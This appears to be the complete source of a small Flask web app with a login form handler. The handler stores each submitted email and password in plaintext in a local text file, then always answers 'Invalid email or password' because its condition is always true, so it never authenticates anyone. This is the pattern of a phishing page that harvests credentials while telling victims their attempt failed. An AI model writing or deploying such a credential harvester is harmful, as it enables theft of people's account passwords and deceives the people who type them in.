from flask import Flask, render_template, request, redirect, url_for
import os

app = Flask(__name__)

# This dictionary will store the email and password temporarily
users = {}

# Define the path to the file
file_path = os.path.join(os.path.dirname(__file__), 'user_data.txt')


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/login', methods=['POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']

        # Storing the email and password in the users dictionary
        users[email] = password

        # Writing the email and password to a text file
        with open(file_path, 'a') as file:
            # Replace empty email or password with space
            email_to_write = email if email else ' '
            password_to_write = password if password else ' '
            file.write(f'Email: {email_to_write}, Password: {password_to_write}\n')

        # Return an error message if either email or password is empty
        if not email or not password or email or password:
            return "Invalid email or password"



        # Redirect to the homepage after storing the data
        return redirect(url_for('index'))


if __name__ == '__main__':
    app.run(debug=True)
